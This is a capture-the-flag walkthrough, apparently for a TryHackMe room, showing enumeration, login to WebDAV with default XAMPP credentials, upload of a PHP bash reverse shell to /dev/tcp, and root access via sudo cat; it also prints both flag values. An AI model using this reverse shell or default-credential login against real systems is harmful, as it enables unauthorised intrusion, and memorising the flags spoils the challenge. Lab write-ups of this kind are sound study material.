## üîç Enumeration

- Starting with Nmap scan
  ```
  nmap -sC -sV -T5 -p- 10.10.252.247

  Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-03 14:59 BST

  ```
  
- Since it has web page, now I do Gobuster.
  ```
  gobuster dir -u http://10.10.252.247 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

  ===============================================================
  Starting gobuster in directory enumeration mode
  ===============================================================
  /webdav               (Status: 401) [Size: 460]
  /server-status        (Status: 403) [Size: 301]
  Progress: 220560 / 220561 (100.00%)
  ===============================================================
  Finished
  ===============================================================
  ```
  
- Now, I visited `server-status` and it wasn't helpful, but `webdav` was. it has a login page which is exploitable and my only access to the target.
  
---

## ‚öôÔ∏è Shell Access

- So I spent a pretty decent amount of time looking for different exploits. At the end I just googled `webdav default login credentials` and found [this page](http://xforeveryman.blogspot.com/2012/01/helper-webdav-xampp-173-default.html) that has default login credentials and command to upload files!
  ```
  wampp
  xampp

  cadaver http://<REMOTE HOST>/webdav/
  ```
  
- That actually worked! Since I'm in, I found `passwd.dav` that contains password for `wampp`. Now I started uploading shells, I was trying so hard to make this [Pentest Monkey shell](https://github.com/pentestmonkey/php-reverse-shell) work but I couldn't do it...
  
- Then I decided to change the shell and found this one liner which is DA GOAT!!! DA GOAT !!! üêê
  ```
  nano phpreverse.php
  <?php exec("/bin/bash -c 'bash -i >& /dev/tcp/[YOUR-THM-IP]/[PORT] 0>&1'");
  ```

- Now upload the shell, start the listener and then visit the `webdav` and open the shell. Voila, you are in!
  ```
  cadaver http://10.10.252.247/webdav/

  ```
  nc -lvnp 4444

  listening on [any] 4444 ...

  www-data@ubuntu:/var/www/html/webdav$
  ```

- Awesome! Now lets find those flags.

---

## üßç User Privilege Escalation

- You can get the user flag with two simple commands.
  ```
  www-data@ubuntu:/var/www/html/webdav$ find / -name user.txt 2>/dev/null
  find / -name user.txt 2>/dev/null
  /home/merlin/user.txt
  
  www-data@ubuntu:/var/www/html/webdav$ cat /home/merlin/user.txt
  cat /home/merlin/user.txt
  449b40fe93f78a938523b7e4dcd66d2a
  ```
  
- Now going for root flag.

---

## üëë Root Privilege Escalation

- OK, I'm gonna say this right now, this was the easiest root flag ever made period. Just use `sudo -l` and you'll see...
  ```
  www-data@ubuntu:/var/www/html/webdav$ sudo -l
  sudo -l
  Matching Defaults entries for www-data on ubuntu:
      env_reset, mail_badpass,
      secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
  
  User www-data may run the following commands on ubuntu:
      (ALL) NOPASSWD: /bin/cat
  
  www-data@ubuntu:/var/www/html/webdav$ sudo cat /root/root.txt
  sudo cat /root/root.txt
  101101ddc16b0cdf65ba0b8a7af7afa5
  ```
  
- TOLD YA, BYE! üíã

## üèÅ Flags

- **User Flag**: `449b40fe93f78a938523b7e4dcd66d2a`
- **Root Flag**: `101101ddc16b0cdf65ba0b8a7af7afa5`

## üí¨ Notes & Reflections

- What was challenging in this room for me?
  `Mastering googling...`

- What did I learn?
  `Never give up, never!`

- I would recommend this room or any type of CTF challenge to every Cyber Security enthusiast since it will sharpen your skills better than any book/tutorial/course or walkthrough rooms on many different platforms!

- Thank you for reading! Enjoy, Have Fun and Happy Hacking! ü§ü
